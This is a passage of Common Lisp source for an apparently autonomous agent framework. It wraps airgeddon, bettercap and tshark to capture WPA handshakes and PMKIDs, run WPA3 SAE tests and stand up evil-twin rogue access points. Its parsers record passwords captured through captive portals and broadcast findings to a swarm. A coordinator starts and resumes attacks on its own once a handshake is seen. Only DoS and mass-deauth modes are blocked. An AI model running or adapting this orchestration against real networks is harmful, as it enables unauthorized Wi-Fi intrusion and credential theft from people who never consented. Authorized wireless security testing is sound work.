               spectrum (but shorter range).")

   (channel :initarg :channel
            :initform nil
            :accessor airgeddon-channel
            :documentation
            "Optional specific channel to target (integer).
               If NIL, airgeddon scans all channels in the selected band.
               For 2.4 GHz: channels 1-14 (1-11 in North America).
               For 5 GHz: channels 36-165 (varies by region).")

   (target-bssid :initarg :target-bssid
                 :initform nil
                 :accessor airgeddon-target-bssid
                 :documentation
                 "Target AP BSSID for focused attacks.
               Required for :HANDSHAKE and :EVIL-TWIN modes.
               Optional for :WPA3-AUDIT (scans all APs if NIL).
               Format: AA:BB:CC:DD:EE:FF")

   (target-ssid :initarg :target-ssid
                :initform nil
                :accessor airgeddon-target-ssid
                :documentation
                "Target AP SSID (network name).
               Required for :EVIL-TWIN mode (the rogue AP needs to
               impersonate a specific network name).
               Optional for other modes.")

   (progress-percentage :initform 0
                        :accessor airgeddon-progress
                        :documentation
                        "Current attack progress as percentage (0-100).
               Updated by PARSE-FINDINGS :AFTER when progress lines
               are detected in airgeddon output."))

  (:documentation
   "Airgeddon agent -- WPA3 auditing and controlled stress testing.

This agent wraps airgeddon for orchestrated Wi-Fi security testing.
Airgeddon is a multi-use bash script for Linux systems to audit wireless
networks. It supports a wide range of attacks from handshake capture to
WPA3-SAE testing.

POLICY ENFORCEMENT:
All destructive modes (full DoS, broad deauth) are blocked by the policy
gatekeeper. Only the following modes are permitted:
  :WPA3-AUDIT  -- Tests SAE authentication resilience (safe)
  :HANDSHAKE   -- Captures WPA/WPA2 4-way handshakes (safe with target)
  :EVIL-TWIN   -- Creates a controlled rogue AP (requires explicit target)

The following modes are PERMANENTLY BLOCKED and will signal an error:
  :DOS         -- Full denial of service attacks
  :BROAD-DEAUTH -- Mass deauthentication of all nearby clients

Example usage:
  ;; WPA3 SAE audit on 2.4 GHz
  (make-airgeddon-agent \"wlan1\" :attack-mode :wpa3-audit)

  ;; Handshake capture targeting specific AP
  (make-airgeddon-agent \"wlan1\"
                        :attack-mode :handshake
                        :channel 6
                        :target-bssid \"AA:BB:CC:DD:EE:FF\")

  ;; Evil twin (authorized penetration test only)
  (make-airgeddon-agent \"wlan1\"
                        :attack-mode :evil-twin
                        :target-ssid \"Corporate-Guest\"
                        :target-bssid \"AA:BB:CC:DD:EE:FF\")

Thread-safety: Standard kali-agent process-lock protects all state.
"))


(defun make-airgeddon-agent (interface &key (attack-mode :wpa3-audit)
                                            band
                                            channel
                                            target-bssid
                                            target-ssid)
  "Create an airgeddon agent.

Parameters:
  INTERFACE    -- Wireless interface name (e.g., \"wlan1\", \"wlan0\").
  ATTACK-MODE  -- Attack mode keyword:
                  :WPA3-AUDIT (default) -- SAE authentication testing
                  :HANDSHAKE            -- WPA handshake capture
                  :EVIL-TWIN            -- Controlled rogue AP
                  :DOS, :BROAD-DEAUTH   -- BLOCKED (signals error)
  BAND         -- Frequency band: :2.4 (default) or :5.
  CHANNEL      -- Optional channel number to target.
  TARGET-BSSID -- Target AP MAC address (required for :HANDSHAKE, :EVIL-TWIN).
  TARGET-SSID  -- Target network name (required for :EVIL-TWIN).

Returns: A configured AIRGEDDON-AGENT instance.

Signals: ERROR if ATTACK-MODE is :DOS or :BROAD-DEAUTH (blocked).

Examples:
  ;; WPA3 audit (safest mode, scans all APs)
  (make-airgeddon-agent \"wlan1\" :attack-mode :wpa3-audit)

  ;; Handshake capture on channel 6
  (make-airgeddon-agent \"wlan1\"
                        :attack-mode :handshake
                        :channel 6
                        :target-bssid \"AA:BB:CC:DD:EE:FF\")

  ;; 5 GHz band WPA3 audit
  (make-airgeddon-agent \"wlan1\"
                        :attack-mode :wpa3-audit
                        :band :5
                        :channel 36)

  ;; Evil twin attack (authorized test only)
  (make-airgeddon-agent \"wlan1\"
                        :attack-mode :evil-twin
                        :target-bssid \"AA:BB:CC:DD:EE:FF\"
                        :target-ssid \"Test-Network\")

Thread-safety: Creates a new instance, no global mutation.
Safe from any thread.

References:
  -- https://github.com/v1s1t0r1sh3r3/airgeddon -- Airgeddon project"
  ;; Enforce policy gatekeeper -- block destructive modes
  (when (member attack-mode '(:dos :broad-deauth))
    (error "[WIFI-POLICY] Attack mode ~A is BLOCKED by policy gatekeeper. ~
            Destructive modes (:DOS, :BROAD-DEAUTH) are not permitted."
           attack-mode))
  ;; Validate required parameters for specific modes
  (when (and (eq attack-mode :handshake) (null target-bssid))
    (warn "[WIFI] HANDSHAKE mode without target-bssid will capture ALL ~
           handshakes in range. This may violate policy. Set :TARGET-BSSID."))
  (when (eq attack-mode :evil-twin)
    (unless target-bssid
      (error "[WIFI] EVIL-TWIN mode requires :TARGET-BSSID."))
    (unless target-ssid
      (error "[WIFI] EVIL-TWIN mode requires :TARGET-SSID (network name).")))
  ;; Build the agent
  (let* ((binary (or (find-kali-binary "airgeddon")
                     (warn "[WIFI] airgeddon not found. Install with: ~
                            git clone https://github.com/v1s1t0r1sh3r3/airgeddon")))
         ;; Map attack mode to airgeddon options
         (mode-args (case attack-mode
                      (:wpa3-audit
                       (append (list "--wpa3"
                                     (when channel
                                       (list "--channel" (prin1-to-string channel)))
                                     (when target-bssid
                                       (list "--bssid" target-bssid)))))
                      (:handshake
                       (append (list "--handshake"
                                     (when channel
                                       (list "--channel" (prin1-to-string channel)))
                                     (when target-bssid
                                       (list "--bssid" target-bssid)))))
                      (:evil-twin
                       (append (list "--evil-twin"
                                     "--ssid" target-ssid
                                     (when target-bssid
                                       (list "--bssid" target-bssid)))))
                      (otherwise
                       (list "--wpa3"))))
         (band-arg (case band
                     (:5 (list "--band" "5"))
                     (:2.4 (list "--band" "2.4"))
                     (t nil)))
         (args (append mode-args band-arg (list interface))))
    (make-instance 'airgeddon-agent
                   :binary (or binary "airgeddon")
                   :args (alexandria:flatten args)
                   :tool-category :wireless
                   :target (or target-bssid interface)
                   :attack-mode attack-mode
                   :band (or band :2.4)
                   :channel channel
                   :target-bssid target-bssid
                   :target-ssid target-ssid
                   :capabilities (case attack-mode
                                   (:wpa3-audit '(:wpa3-testing :sae-auth))
                                   (:handshake '(:handshake-capture :wpa-analysis))
                                   (:evil-twin '(:rogue-ap :captive-portal))
                                   (otherwise '(:wifi-audit)))
                   :timeout *kali-default-timeout*
                   :restart-policy #'kali-default-restart-policy)))


;; ═══════════════════════════════════════════════════════════════════════════
;; Section W.3: Output Parsers -- Wi-Fi Specific Findings
;; ═══════════════════════════════════════════════════════════════════════════

(defmethod parse-findings :after ((agent bettercap-agent) line)
  "Parse bettercap output for Wi-Fi specific findings.

This :AFTER method extends the base PARSE-FINDINGS with bettercap-specific
parsing for:
  -- New AP discoveries (BSSID, SSID, channel, encryption type)
  -- WPA handshake captures (WPA handshake detected messages)
  -- Client associations (client MAC + associated BSSID)
  -- Deauthentication frame detection (security event)
  -- Module status changes

Each finding is pushed to the agent's findings list and broadcast to the
:SWARM.WIFI.* gossip topics for swarm-wide visibility.

Parameters:
  AGENT -- The BETTERCAP-AGENT producing this line.
  LINE  -- A string, one line of output from bettercap.

Returns: A finding plist, or NIL if no finding was detected.

Finding types produced:
  :AP-DISCOVERED       -- New access point found
  :WPA-HANDSHAKE       -- WPA handshake captured
  :CLIENT-ASSOCIATION  -- Client joined an AP
  :DEAUTH-DETECTED     -- Deauthentication frame observed
  :MODULE-STATUS       -- Module loaded/unloaded
  :SIGNAL-STRENGTH     -- RSSI reading for a station"
  (flet ((make-wifi-finding (type &rest extra-keys)
           `(:type ,type
             :tool :bettercap
             :target ,(or (bettercap-target-bssid agent)
                          (bettercap-interface agent))
             :raw ,line
             :timestamp ,(local-time:now)
             ,@extra-keys)))
    (cond
      ;; AP discovery: bettercap wifi.recon output
      ;; Format: "[wifi.ap.new] BSSID: AA:BB:CC:DD:EE:FF SSID: NetworkName"
      ((cl-ppcre:scan "wifi\\.ap\\.new.*BSSID:\\s*([0-9A-Fa-f:]{17})" line)
       (cl-ppcre:register-groups-bind (bssid)
           ("BSSID:\\s*([0-9A-Fa-f:]{17})" line)
         (let* ((ssid (or (cl-ppcre:scan-to-strings "SSID:\\s*(.+?)(?:\\s+|$)" line)
                          "<hidden>"))
                (channel (cl-ppcre:scan-to-strings "channel:\\s*(\\d+)" line))
                (encryption (or (cl-ppcre:scan-to-strings "encryption:\\s*(\\S+)" line)
                                "unknown"))
                (finding (make-wifi-finding :ap-discovered
                                            :bssid bssid
                                            :ssid ssid
                                            :channel channel
                                            :encryption encryption)))
           (push finding (agent-findings agent))
           (publish-message :swarm.wifi.ap-discovered
                            `(:agent-id ,(agent-id agent)
                              :finding ,finding
                              :timestamp ,(local-time:now)))
           finding)))

      ;; WPA handshake capture detection
      ;; Format: "[wifi.client.handshake] WPA handshake: AA:BB:CC:DD:EE:FF"
      ((cl-ppcre:scan "WPA\\s+handshake.*([0-9A-Fa-f:]{17})" line)
       (cl-ppcre:register-groups-bind (ap-bssid)
           ("WPA\\s+handshake.*([0-9A-Fa-f:]{17})" line)
         (setf (bettercap-handshake-captured-p agent) t)
         (let ((finding (make-wifi-finding :wpa-handshake
                                          :bssid ap-bssid
                                          :severity :high)))
           (push finding (agent-findings agent))
           (publish-message :swarm.wifi.handshake
                            `(:agent-id ,(agent-id agent)
                              :finding ,finding
                              :timestamp ,(local-time:now)))
           finding)))

      ;; Client association tracking
      ;; Format: "[wifi.client.new] MAC: AA:BB:CC:DD:EE:FF AP: FF:EE:DD:CC:BB:AA"
      ((cl-ppcre:scan "wifi\\.client.*MAC:\\s*([0-9A-Fa-f:]{17})" line)
       (cl-ppcre:register-groups-bind (client-mac)
           ("MAC:\\s*([0-9A-Fa-f:]{17})" line)
         (let* ((ap-bssid (cl-ppcre:scan-to-strings "AP:\\s*([0-9A-Fa-f:]{17})" line))
                (finding (make-wifi-finding :client-association
                                            :client-mac client-mac
                                            :ap-bssid ap-bssid)))
           (push finding (agent-findings agent))
           finding)))

      ;; Deauthentication frame detection (security event)
      ;; Format: "[wifi.ap.lost] deauth detected from AA:BB:CC:DD:EE:FF"
      ((cl-ppcre:scan "deauth" line)
       (let ((finding (make-wifi-finding :deauth-detected
                                        :detail line
                                        :severity :warning)))
         (push finding (agent-findings agent))
         (publish-message :swarm.wifi.deauth-detected
                          `(:agent-id ,(agent-id agent)
                            :finding ,finding
                            :timestamp ,(local-time:now)))
         finding))

      ;; Signal strength reading (RSSI)
      ;; Format: "RSSI: -65 dBm" or "signal: -70db"
      ((cl-ppcre:scan "(?:RSSI|signal|rssi):\\s*(-?\\d+)" line)
       (cl-ppcre:register-groups-bind (dbm-str)
           ("(?:RSSI|signal|rssi):\\s*(-?\\d+)" line)
         (let ((dbm (parse-integer dbm-str)))
           (make-wifi-finding :signal-strength
                             :dbm dbm))))

      ;; Default: no bettercap-specific finding in this line
      (t nil))))


(defmethod parse-findings :after ((agent airgeddon-agent) line)
  "Parse airgeddon output for Wi-Fi stress-testing findings.

This :AFTER method extends the base PARSE-FINDINGS with airgeddon-specific
parsing for:
  -- Handshake capture status (success/failure/progress)
  -- WPA3 SAE authentication attempt results
  -- Signal strength readings (RSSI in dBm)
  -- Attack progress percentage
  -- PMKID capture detection
  -- Credential discovery (from evil twin / captive portal)

Each finding is pushed to the agent's findings list. Progress findings
update the agent's PROGRESS-PERCENTAGE slot for monitoring.

Parameters:
  AGENT -- The AIRGEDDON-AGENT producing this line.
  LINE  -- A string, one line of output from airgeddon.

Returns: A finding plist, or NIL if no finding was detected.

Finding types produced:
  :HANDSHAKE-CAPTURE   -- WPA handshake captured or status update
  :WPA3-SAE-ATTEMPT    -- SAE authentication exchange observed
  :SIGNAL-STRENGTH     -- RSSI reading
  :ATTACK-PROGRESS     -- Percentage complete
  :PMKID-CAPTURED      -- PMKID obtained
  :CREDENTIAL-FOUND    -- Credential from captive portal (evil twin)
  :AIRGEDDON-ERROR     -- Error condition during attack"
  (flet ((make-wifi-finding (type &rest extra-keys)
           `(:type ,type
             :tool :airgeddon
             :target ,(or (airgeddon-target-bssid agent)
                          (airgeddon-target-ssid agent)
                          "unknown")
             :raw ,line
             :timestamp ,(local-time:now)
             ,@extra-keys)))
    (cond
      ;; Handshake capture success
      ;; Format: "Handshake captured successfully" or "WPA handshake captured"
      ((cl-ppcre:scan "(?i)(handshake captured|handshake found|got handshake)" line)
       (let ((finding (make-wifi-finding :handshake-capture
                                        :status :success
                                        :bssid (airgeddon-target-bssid agent)
                                        :severity :high)))
         (push finding (agent-findings agent))
         (publish-message :swarm.wifi.handshake
                          `(:agent-id ,(agent-id agent)
                            :finding ,finding
                            :timestamp ,(local-time:now)))
         finding))

      ;; Handshake capture failure
      ((cl-ppcre:scan "(?i)(handshake failed|no handshake|timeout)" line)
       (let ((finding (make-wifi-finding :handshake-capture
                                        :status :failed
                                        :bssid (airgeddon-target-bssid agent)
                                        :severity :medium)))
         (push finding (agent-findings agent))
         finding))

      ;; WPA3 SAE authentication attempt
      ;; Format: "SAE commit received" or "WPA3 authentication frame"
      ((cl-ppcre:scan "(?i)(SAE|WPA3|sae commit|sae confirm)" line)
       (let ((finding (make-wifi-finding :wpa3-sae-attempt
                                        :detail line
                                        :mode (airgeddon-attack-mode agent))))
         (push finding (agent-findings agent))
         finding))

      ;; Signal strength reading
      ((cl-ppcre:scan "(?i)(signal|rssi):\\s*(-?\\d+)" line)
       (cl-ppcre:register-groups-bind (dbm-str)
           ("(?i)(?:signal|rssi):\\s*(-?\\d+)" line)
         (let ((dbm (parse-integer dbm-str)))
           (make-wifi-finding :signal-strength
                             :dbm dbm))))

      ;; Attack progress percentage
      ;; Format: "Progress: 45%" or "[=====>      ] 45%"
      ((cl-ppcre:scan "([0-9]+)\\s*%" line)
       (cl-ppcre:register-groups-bind (pct-str)
           ("([0-9]+)\\s*%" line)
         (let ((pct (parse-integer pct-str)))
           (setf (airgeddon-progress agent) pct)
           (make-wifi-finding :attack-progress
                             :percentage pct))))

      ;; PMKID capture detection
      ((cl-ppcre:scan "(?i)(PMKID|pmkid captured|16800)" line)
       (let ((finding (make-wifi-finding :pmkid-captured
                                        :bssid (airgeddon-target-bssid agent)
                                        :severity :critical)))
         (push finding (agent-findings agent))
         finding))

      ;; Credential found (evil twin / captive portal mode)
      ;; Format: "Password found: secret123" or "Captured: user:pass"
      ((cl-ppcre:scan "(?i)(password found|captured|credential)" line)
       (let ((finding (make-wifi-finding :credential-found
                                        :detail line
                                        :severity :critical)))
         (push finding (agent-findings agent))
         finding))

      ;; Error detection
      ((cl-ppcre:scan "(?i)(error|failed|fatal)" line)
       (let ((finding (make-wifi-finding :airgeddon-error
                                        :detail line
                                        :severity :error)))
         (push finding (agent-findings agent))
         finding))

      ;; Default: no airgeddon-specific finding
      (t nil))))


;; ═══════════════════════════════════════════════════════════════════════════
;; Section W.4: Air-Monitor-Agent -- Monitor-Mode Frame Capture
;; ═══════════════════════════════════════════════════════════════════════════

(defclass air-monitor-agent (kali-agent)
  ((capture-file :initarg :capture-file
                 :initform "/tmp/lispmind-capture.pcap"
                 :accessor monitor-capture-file
                 :documentation
                 "Path to the PCAP output file for captured frames.
               Defaults to /tmp/lispmind-capture.pcap.
               The monitor agent writes all captured frames to this
               file for later analysis with tshark, Wireshark, or
               custom parsers.

               IMPORTANT: Ensure sufficient disk space. Monitor mode
               can generate 10-100 MB per minute in busy environments.")

   (filter :initarg :filter
           :initform "type mgt subtype beacon or type mgt subtype auth"
           :accessor monitor-filter
           :documentation
               "Tshark display filter for frame selection.
               Defaults to management frames (beacons + auth) which
               are essential for AP discovery and handshake detection.

               Common filters:
                 \"type mgt\"                    -- All management frames
                 \"type mgt subtype beacon\"     -- Beacon frames only
                 \"type mgt subtype auth\"       -- Authentication frames
                 \"type mgt subtype deauth\"     -- Deauthentication frames
                 \"eapol\"                       -- EAPOL key frames (handshakes)
                 \"wlan.fc.type==2\"             -- Data frames
                 \"wlan.da==AA:BB:CC:DD:EE:FF\" -- Frames to specific MAC

               For handshake capture, use: \"eapol\"")

   (interface :initarg :interface
              :initform "wlan1"
              :accessor monitor-interface
              :documentation
              "Wireless interface to use for monitor mode capture.
               Must support monitor mode. The agent does NOT set monitor
               mode itself -- the interface should already be in monitor
               mode (e.g., wlan1mon) or the agent will attempt to use
               airmon-ng to enable it.")

   (on-handshake-callback :initarg :on-handshake-callback
                          :initform nil
                          :accessor monitor-on-handshake
                          :documentation
                          "Callback function invoked when a handshake
               or SAE authentication is detected in the capture.

               Signature: (lambda (monitor-agent bssid ssid) ...)
                 MONITOR-AGENT -- This agent instance
                 BSSID         -- The AP's MAC address
                 SSID          -- The network name (or NIL if hidden)

               This callback is the bridge between the monitor agent
               and the Air-Stress-Coordinator. When set by
               SPAWN-AIR-MONITOR-SHADOW-PAIR, it routes handshake
               events to the coordinator's ON-HANDSHAKE-DETECTED method.

               If NIL (default), handshake detection is logged but
               no callback is invoked.")

   (frames-captured :initform 0
                    :accessor monitor-frames-captured
                    :documentation
                    "Counter for total frames captured.
               Incremented by the output capture loop for telemetry."))

  (:documentation
   "Monitor Agent: Runs tshark on a wireless interface in monitor mode,
capturing management frames and EAPOL key exchanges.

The AIR-MONITOR-AGENT is the sensing component of the
Air-Monitor-Shadow-Pair pattern. It uses tshark (not airodump-ng) for
maximum parsing flexibility -- tshark's output format is easier to parse
and its display filter language is more expressive than airodump-ng's
options.

When a handshake or SAE authentication frame is detected, the agent:
  1. Creates a finding and pushes it to the findings list.
  2. Broadcasts the event to :swarm.wifi.handshake gossip topic.
  3. Invokes the ON-HANDSHAKE-CALLBACK if set (triggers coordinator).

The monitor runs continuously until stopped. It is designed to be
lightweight -- only capturing filtered frames, not full traffic.

Example usage:
  ;; Basic beacon + auth monitoring
  (make-air-monitor-agent \"wlan1mon\")

  ;; Handshake-focused capture
  (make-air-monitor-agent \"wlan1mon\"
                          :filter \"eapol\"
                          :capture-file \"/tmp/handshakes.pcap\")

  ;; With callback (used internally by shadow pair)
  (make-air-monitor-agent \"wlan1mon\"
                          :on-handshake-callback #'my-handshake-handler)

Thread-safety: Standard kali-agent process-lock. The callback is
invoked WITHIN the capture loop -- keep it fast or delegate to a
separate thread.
"))


(defun make-air-monitor-agent (interface &key filter capture-file on-handshake-callback)
  "Create an air-monitor agent for frame capture in monitor mode.

Parameters:
  INTERFACE           -- Wireless interface (should be in monitor mode,
                         e.g., \"wlan1mon\").
  FILTER              -- Optional tshark display filter string.
                         Defaults to beacon + auth management frames.
  CAPTURE-FILE        -- Output PCAP file path.
                         Defaults to /tmp/lispmind-capture.pcap.
  ON-HANDSHAKE-CALLBACK -- Optional function called on handshake detection.
                           Signature: (lambda (agent bssid ssid) ...)

Returns: A configured AIR-MONITOR-AGENT instance.

Examples:
  ;; Basic monitoring
  (make-air-monitor-agent \"wlan1mon\")

  ;; Handshake-focused
  (make-air-monitor-agent \"wlan1mon\"
                          :filter \"eapol\"
                          :capture-file \"/tmp/handshakes.pcap\")

  ;; Custom filter for deauth detection
  (make-air-monitor-agent \"wlan1mon\"
                          :filter \"type mgt subtype deauth\")

Thread-safety: Creates a new instance, no global mutation.
Safe from any thread."
  (let* ((binary (or (find-kali-binary "tshark")
                     (warn "[WIFI] tshark not found. Install with: apt install tshark")))
         (actual-filter (or filter
                            "type mgt subtype beacon or type mgt subtype auth"))
         (actual-capture-file (or capture-file
                                  "/tmp/lispmind-capture.pcap"))
         (args (append
                (list "-i" interface)
                (list "-f" actual-filter)
                (list "-w" actual-capture-file)
                (list "-l")  ; Line-buffered output
                (list "-T" "fields")
                (list "-e" "wlan.bssid")
                (list "-e" "wlan.ssid")
                (list "-e" "wlan.rssi")
                (list "-e" "frame.protocols"))))
    (make-instance 'air-monitor-agent
                   :binary (or binary "tshark")
                   :args (alexandria:flatten args)
                   :tool-category :wireless
                   :target interface
                   :interface interface
                   :filter actual-filter
                   :capture-file actual-capture-file
                   :on-handshake-callback on-handshake-callback
                   :capabilities '(:monitor-mode :frame-capture
                                   :handshake-detection :beacon-scanning)
                   :timeout nil  ; Run indefinitely
                   :restart-policy #'kali-default-restart-policy)))


(defmethod parse-findings :after ((agent air-monitor-agent) line)
  "Parse monitor agent output for frame-level findings.

Detects:
  -- EAPOL key frames (WPA handshake indicators)
  -- Beacon frames with BSSID/SSID
  -- Authentication frames (SAE or Open)
  -- Deauthentication frames
  -- Signal strength readings

When a handshake is detected and ON-HANDSHAKE-CALLBACK is set, invokes
the callback with the detected BSSID and SSID.

Parameters:
  AGENT -- The AIR-MONITOR-AGENT.
  LINE  -- One line of tshark field output.

Returns: A finding plist, or NIL."
  (flet ((make-monitor-finding (type &rest extra-keys)
           `(:type ,type
             :tool :tshark-monitor
             :target ,(monitor-interface agent)
             :raw ,line
             :timestamp ,(local-time:now)
             ,@extra-keys)))
    (cond
      ;; EAPOL frame = potential handshake
      ((search "EAPOL" line)
       (let* ((bssid (cl-ppcre:scan-to-strings "([0-9A-Fa-f:]{17})" line))
              (finding (make-monitor-finding :eapol-frame
                                            :bssid bssid
                                            :severity :high)))
         (push finding (agent-findings agent))
         (incf (monitor-frames-captured agent))
         ;; Invoke callback if set
         (when (monitor-on-handshake agent)
           (handler-case
               (funcall (monitor-on-handshake agent) agent bssid nil)
             (error (e)
               (warn "[WIFI] Handshake callback error: ~A" e))))
         (publish-message :swarm.wifi.handshake
                          `(:agent-id ,(agent-id agent)
                            :finding ,finding
                            :timestamp ,(local-time:now)))
         finding))

      ;; Beacon frame
      ((search "beacon" line)
       (let ((finding (make-monitor-finding :beacon-frame)))
         (push finding (agent-findings agent))
         (incf (monitor-frames-captured agent))
         finding))

      ;; Authentication frame
      ((search "auth" line)
       (let ((finding (make-monitor-finding :auth-frame)))
         (push finding (agent-findings agent))
         (incf (monitor-frames-captured agent))
         finding))

      ;; Deauthentication frame (security event)
      ((search "deauth" line)
       (let ((finding (make-monitor-finding :deauth-frame
                                            :severity :warning)))
         (push finding (agent-findings agent))
         (incf (monitor-frames-captured agent))
         (publish-message :swarm.wifi.deauth-detected
                          `(:agent-id ,(agent-id agent)
                            :finding ,finding
                            :timestamp ,(local-time:now)))
         finding))

      ;; Default
      (t
       (incf (monitor-frames-captured agent))
       nil))))


;; ═══════════════════════════════════════════════════════════════════════════
;; Section W.5: Air-Stress-Coordinator -- The Brains of the Pair
;; ═══════════════════════════════════════════════════════════════════════════

(defclass air-stress-coordinator (agent)
  ((monitor-agent :initarg :monitor-agent
                  :accessor coordinator-monitor
                  :documentation
                  "The AIR-MONITOR-AGENT that provides sensory input.
               The coordinator reads this agent's findings to detect
               handshakes, signal changes, and security events.")

   (stress-agent :initarg :stress-agent
                 :accessor coordinator-stress
                 :documentation
                 "The AIRGEDDON-AGENT that performs stress testing.
               The coordinator starts, stops, and reconfigures this
               agent based on monitor findings and signal conditions.")

   (signal-threshold :initarg :signal-threshold
                     :initform -70
                     :accessor coordinator-signal-threshold
                     :documentation
                     "Signal strength threshold in dBm.
               When signal drops below this value, the coordinator
               halts the stress test to save power and CPU cycles.
               When signal recovers above this value + hysteresis (5 dB),
               testing resumes.

               Default: -70 dBm (weak but usable signal)
               Range: -90 (very weak) to -30 (very strong)
               Typical values:
                 -50 dBm -- Excellent (close range)
                 -65 dBm -- Good (normal range)
                 -70 dBm -- Fair (borderline, default threshold)
                 -80 dBm -- Poor (may drop packets)")

   (hysteresis-db :initform 5
                  :accessor coordinator-hysteresis-db
                  :documentation
                  "Hysteresis margin in dB for signal threshold.
               The stress test resumes only when signal exceeds
               SIGNAL-THRESHOLD + HYSTERESIS-DB. This prevents
               rapid start/stop cycling near the threshold.

               Default: 5 dB. So with default threshold (-70 dBm),
               testing resumes at -65 dBm.")

   (active-p :initform nil
             :accessor coordinator-active-p
             :documentation
             "Whether the stress test is currently active.
               Set to T by ON-HANDSHAKE-DETECTED when starting,
               NIL by ON-SIGNAL-WEAK when halting.")

   (halted-by-signal-p :initform nil
                       :accessor coordinator-halted-by-signal-p
                       :documentation
             "Whether the current halt is due to weak signal.
               Distinguishes signal-based halts from other causes
               (manual halt, completion, error). Used by
               ON-SIGNAL-STRONG to decide whether to auto-resume.")

   (target-bssid :initarg :target-bssid
                 :initform nil
                 :accessor coordinator-target-bssid
                 :documentation
                 "The BSSID being targeted for stress testing.
               Set during pair creation. The coordinator verifies
               that detected handshakes match this target before
               initiating stress tests.")

   (target-ssid :initarg :target-ssid
                :initform nil
                :accessor coordinator-target-ssid
                :documentation "The SSID being targeted.
               Stored for display and gossip messages.")

   (start-time :initform nil
               :accessor coordinator-start-time
               :documentation
               "Timestamp when the current stress test started.
               NIL if no active test. Used for elapsed-time reporting
               and timeout detection.")

   (total-runtime :initform 0
                  :accessor coordinator-total-runtime
                  :documentation
               "Cumulative runtime in seconds across all stress sessions.
               Incremented when a session ends. For reporting only.")

   (handshake-count :initform 0
                    :accessor coordinator-handshake-count
                    :documentation
               "Total handshakes detected during this coordinator's lifetime.
               Incremented by ON-HANDSHAKE-DETECTED.")

   (session-count :initform 0
                  :accessor coordinator-session-count
                  :documentation
               "Number of stress test sessions completed.
               Incremented each time a test starts successfully."))

  (:documentation
   "The coordinator that links the Monitor and Stress agents.

The AIR-STRESS-COORDINATOR is the decision-making component of the
Air-Monitor-Shadow-Pair pattern. It implements an autonomous control
loop with three states:

  IDLE     -- Waiting for a handshake detection from the monitor.
              The stress agent is not running.

  ACTIVE   -- Handshake detected; stress test running.
              The airgeddon agent is executing against the target.

  HALTED   -- Signal dropped below threshold; stress test paused.
              Will auto-resume when signal recovers.

STATE TRANSITIONS:
  + Handshake detected  -->  START stress test  -->  ACTIVE
  + Signal < threshold  -->  HALT stress test   -->  HALTED
  + Signal > threshold  -->  RESUME stress test -->  ACTIVE
  + Manual halt         -->  STOP stress test   -->  IDLE
  + Completion          -->  STOP stress test   -->  IDLE

The coordinator is a full AGENT citizen: it has health, heartbeat,
strategy, and can be healed by the orchestrator. Its strategy function
polls the monitor agent's findings and the stress agent's status,
invoking the appropriate callbacks.

The signal threshold prevents wasted effort: if the target AP's signal
is too weak, the stress test is unlikely to succeed and consumes CPU/
power. The coordinator halts gracefully and waits for better conditions.

Example creation:
  (spawn-air-monitor-shadow-pair \"wlan1\" \"AA:BB:CC:DD:EE:FF\")

This creates the full pair: monitor + stress + coordinator, registers
all three with the orchestrator, and returns the coordinator ID.
"))


(defun spawn-air-monitor-shadow-pair (interface target-bssid
                                      &key target-ssid
                                           (signal-threshold -70)
                                           (attack-mode :wpa3-audit))
  "Spawn the full Air-Monitor-Shadow-Pair subsystem.

This is the high-level constructor for the autonomous Wi-Fi stress-testing
pattern. It creates three linked agents:

  1. AIR-MONITOR-AGENT    -- Captures frames, detects handshakes
  2. AIRGEDDON-AGENT      -- Performs stress testing (policy-gated)
  3. AIR-STRESS-COORDINATOR -- Decides when to start/stop testing

The coordinator links the monitor and stress agents, implementing
autonomous control based on handshake detection and signal strength.

Parameters:
  INTERFACE        -- Wireless interface name (e.g., \"wlan1\").
                      Will be used as wlan1mon for monitor mode.
  TARGET-BSSID     -- MAC address of the target AP to stress-test.
  TARGET-SSID      -- Optional network name (for display/gossip).
  SIGNAL-THRESHOLD -- dBm threshold for auto-halt (default -70).
  ATTACK-MODE      -- Airgeddon mode: :WPA3-AUDIT (default),
                      :HANDSHAKE, or :EVIL-TWIN.

Returns: The coordinator agent ID (a gensym).

Steps performed:
  1. Create air-monitor-agent on INTERFACE
  2. Create airgeddon-agent targeting TARGET-BSSID
  3. Create air-stress-coordinator linking them
  4. Register the coordinator's callback with the monitor
  5. Register all three agents with the orchestrator
  6. Publish pair-creation event to gossip
  7. Return coordinator agent ID

Example:
  ;; Basic WPA3 audit pair
  (spawn-air-monitor-shadow-pair \"wlan1\" \"AA:BB:CC:DD:EE:FF\")

  ;; With custom threshold and mode
  (spawn-air-monitor-shadow-pair \"wlan1\" \"AA:BB:CC:DD:EE:FF\"
                                 :signal-threshold -65
                                 :attack-mode :handshake)

  ;; With SSID for display
  (spawn-air-monitor-shadow-pair \"wlan1\" \"AA:BB:CC:DD:EE:FF\"
                                 :target-ssid \"Corp-Net\")

Thread-safety: Creates new instances, no global mutation except
  orchestrator registration. Safe from any thread.

Side effects:
  -- Registers 3 agents with the orchestrator.
  -- Publishes gossip event.
  -- Starts the monitor agent capturing frames."
  (let* ((monitor-interface (format nil "~Amon" interface))
         ;; Step 1: Create the monitor agent
         (monitor (make-air-monitor-agent monitor-interface
                                          :filter "eapol"
                                          :capture-file (format nil "/tmp/lispmind-~A.pcap"
                                                               (substitute #\- #\: target-bssid))))
         ;; Step 2: Create the stress agent (airgeddon)
         (stress (make-airgeddon-agent interface
                                       :attack-mode attack-mode
                                       :target-bssid target-bssid
                                       :target-ssid target-ssid))
         ;; Step 3: Create the coordinator
         (coordinator (make-instance 'air-stress-coordinator
                                     :monitor-agent monitor
                                     :stress-agent stress
                                     :signal-threshold signal-threshold
                                     :target-bssid target-bssid
                                     :target-ssid target-ssid
                                     :capabilities '(:wifi-coordination
                                                     :autonomous-stress
                                                     :signal-adaptive)
                                     :restart-policy #'kali-default-restart-policy)))
    ;; Step 4: Link the monitor's callback to the coordinator
    (setf (monitor-on-handshake monitor)
          (lambda (mon bssid ssid)
            (declare (ignore mon))
            (on-handshake-detected coordinator bssid ssid)))
    ;; Step 5: Register all agents with orchestrator
    (when *default-orchestrator*
      (register-agent *default-orchestrator* monitor)
      (register-agent *default-orchestrator* stress)
      (register-agent *default-orchestrator* coordinator))
    ;; Also register monitor and stress in Kali registry
    (register-kali-agent monitor)
    (register-kali-agent stress)
    ;; Register coordinator in Wi-Fi registry
    (setf (gethash (agent-id coordinator) *wifi-agent-registry*) coordinator)
    ;; Step 6: Publish creation event
    (publish-message :swarm.wifi.stress-start
                     `(:event :shadow-pair-created
                       :coordinator ,(agent-id coordinator)
                       :monitor ,(agent-id monitor)
                       :stress ,(agent-id stress)
                       :target-bssid ,target-bssid
